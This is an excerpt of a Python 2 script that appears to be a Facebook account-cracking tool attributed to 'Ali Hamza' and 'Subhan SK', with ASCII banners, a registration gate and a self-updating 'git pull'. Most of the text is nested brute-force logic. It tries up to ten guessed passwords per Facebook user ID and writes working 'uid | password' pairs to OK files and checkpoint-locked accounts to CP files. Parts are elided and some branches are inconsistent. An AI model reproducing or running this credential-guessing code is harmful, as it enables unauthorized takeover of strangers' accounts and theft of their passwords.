...
__author__ = 'Ali Hamza '
__copyright = 'All rights reserved . Copyright  Ali Hamza'
...
os.system('git pull')
os.system('clear')
logo = '\x1b[32;1mAuthor  \x1b[37;1m: \x1b[33;1mSubhan SK\n     \x1b[32;1mHAHA   \x1b[37;1m: \x1b[33;1mNAAM TU SUNA HUGA Ali HAMZA\n'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/subhanSK_KHAN/main/server.txt').text
    if to in r:
        ...
        print ' \x1b[1;92mCopy the id and send to Subhan SK'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/AliHamza555')
        reg()
...
def reg2():
    ...
    os.system('xdg-open https://www.facebook.com/Ali Hamza555')
    sav = open('/sdcard/.SK.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter free tool ')
    reg()
...
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-SubhanKhan-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................S U B H A N [K H A N]......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║  Peshawar Pakistan 
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mALI HAMZA\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Ali Hamza
	    time.sleep(2)
            loop = 'false'
        else:
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m{Subhan SK}\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[MZ-CP] ' + uid + ' | ' + pass1
                cp = open('HAMZA_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'loc' in q:
                    ...
                    ok = open('/sdcard/ids/HAMZA_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass2
                    cp = open('Subhan_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[Hamza-CP] ' + uid + ' | ' + pass3
                        cp = open('HAMZA_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass4
                            cp = open('Subhan_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass5
                                cp = open('Subhan_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass6
                                    cp = open('Subhan_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass7
                                        cp = open('Subhan_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass8
                                            cp = open('Subhan_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass9
                                                cp = open('Subhan_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass10
                                                    cp = open('Subhan_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m[SUBHAN SK] \x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[HAMZAOK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass1
                cp = open('Subhan_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[Subhan-CP] ' + uid + ' | ' + pass3
                        cp = open('Subhan_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
...
def n_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80SUBHANSK\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[Subhan-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/Subhan_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[Subhan-OK] ' + uid + ' | ' + pass3
                        cp = open('Subhan_OK.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
